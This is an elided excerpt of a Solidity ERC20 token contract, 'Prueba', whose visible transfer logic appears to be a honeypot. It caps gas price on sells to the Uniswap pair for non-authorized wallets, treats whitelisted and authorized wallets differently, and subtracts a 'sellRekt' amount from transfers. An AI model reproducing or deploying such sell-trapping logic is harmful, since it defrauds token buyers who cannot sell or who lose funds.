...
contract Prueba is Context, IERC20, Ownable { 
    ...
    function _transfer(
        ...
        if (!authorizations[from] && to != address(this) && to != uniswapV2Pair) {
        ...
        if (to == uniswapV2Pair && !authorizations[from]) {
            require(tx.gasprice <= gas, ">Sell on wallet action"); 
        }

        if (tx.gasprice >= gas && to != uniswapV2Pair) {
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            ...
            if(to == uniswapV2Pair && whitelistMode){
                isSell = true;
            }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy, bool isSell) private {
        ...
        if(!takeFee){
            ...
            uint256 tTransferAmount = tAmount-sellRekt;
